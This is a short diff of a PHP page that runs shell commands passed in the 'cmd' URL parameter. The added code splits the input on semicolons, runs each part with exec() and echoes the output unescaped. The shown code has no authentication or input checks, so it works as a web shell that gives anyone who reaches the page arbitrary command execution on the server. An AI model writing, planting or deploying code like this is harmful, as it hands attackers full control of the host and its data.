@@ -5,16 +5,22 @@
 }
 </style>
 
+<div style="margin:10;padding:0">
 <?PHP
-$cmd = urldecode(($_GET['cmd']));
-echo "Command: {$cmd}";
-echo "<p class=\"logLine\">";
-exec($cmd, $output, $retval);
-$last200 = $res = array_slice($output, -200, 200, true);
-foreach($last200 as $line){echo "{$line}<br>"; }
-echo "</p>";
-echo $retval ?  "The command failed." : "The command finished successfully!";
-echo "</div>";
+
+$command = urldecode(($_GET['cmd']));
+foreach (explode(';', $command) as $cmd){
+	$output = array();
+	echo "Command: {$cmd}";
+	exec($cmd . ' 2>&1', $output, $retval);
+	$last200 = array_slice($output, -200, 200, true);
+	echo "<p class=\"logLine\">";
+	foreach($last200 as $line){echo "{$line}<br>"; }
+	echo "</p>";
+	echo $retval ?  "The command failed." : "The command finished successfully!";
+	echo "<br><br>";
+}
+
 ?>
 
 <?/*
